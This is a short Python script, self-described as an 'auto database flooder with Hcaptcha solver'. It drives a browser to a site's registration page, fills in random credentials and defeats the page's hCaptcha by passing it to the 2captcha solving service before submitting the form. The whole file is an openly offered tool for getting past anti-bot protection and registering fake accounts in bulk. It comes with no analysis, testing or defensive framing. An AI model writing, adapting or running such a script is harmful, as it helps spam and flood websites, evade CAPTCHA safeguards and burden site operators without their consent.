import random
import requests
import string
import time
from selenium import webdriver
#auto database flooder with Hcaptcha solver

# Generate a random username
username_length = 8
username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))

# Generate a random password
password_length = 12
password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=password_length))

# Solve the hcaptcha using 2captcha
def solve_hcaptcha(site_key, page_url):
    api_key = '2CAPTCHA_API_KEY'#api key here
    api_url = 'https://2captcha.com/in.php'
    
    # Send the hcaptcha to 2captcha
    data = {
        'key': api_key,
        'method': 'hcaptcha',
        'googlekey': site_key,
        'pageurl': page_url
    }
    response = requests.post(api_url, data=data)
    
    # Check if the hcaptcha was sent successfully
    if response.text.startswith('OK|'):
        # The hcaptcha was sent successfully, so get the captcha ID
        captcha_id = response.text[3:]
        
        # Poll the 2captcha API until the hcaptcha is solved
        api_url = 'https://2captcha.com/res.php'
        params = {
            'key': api_key,
            'action': 'get',
            'id': captcha_id,
        }
        while True:
            response = requests.get(api_url, params=params)
            if response.text == 'CAPCHA_NOT_READY':
                time.sleep(5)  # Sleep for 5 seconds before polling again
            else:
                break
        
        # Return the hcaptcha solution
        return response.text
    else:
        # There was an error sending the hcaptcha to 2captcha
        raise Exception('Error sending hcaptcha to 2captcha: {}'.format(response.text))

# Start a web browser and navigate to the registration page
driver = webdriver.Firefox()
driver.get('http://example.com/register.php')

# Wait for the hcaptcha to load
time.sleep(5)

# Solve the hcaptcha
site_key = driver.find_element_by_css_selector('#h-captcha').get_attribute('data-sitekey')
page_url = driver.current_url
hcaptcha_response = solve_hcaptcha(site_key, page_url)

# Fill out the registration form
driver.find_element_by_css_selector('#username').send_keys(username)
driver.find_element_by_css_selector('#password').send_keys(password)
driver.find_element_by_css_selector('#same-password').send_keys(password) # remove this if there is no retry pass and change those to whatever username&pass named on the page src
driver.find_element_by_css_selector('#h-captcha-response').send_keys(hcaptcha_response)

# Submit the form
driver.find_element_by_css_selector('#submit-button').click()

# Wait for the page to load
time.sleep(5)

# Check if the registration was successful
success_message = driver.find_element_by_css_selector('#success-message')
if success_message:
    print('Registration successful')
else:
    print('Registration failed')


# Close the web browser
driver.quit()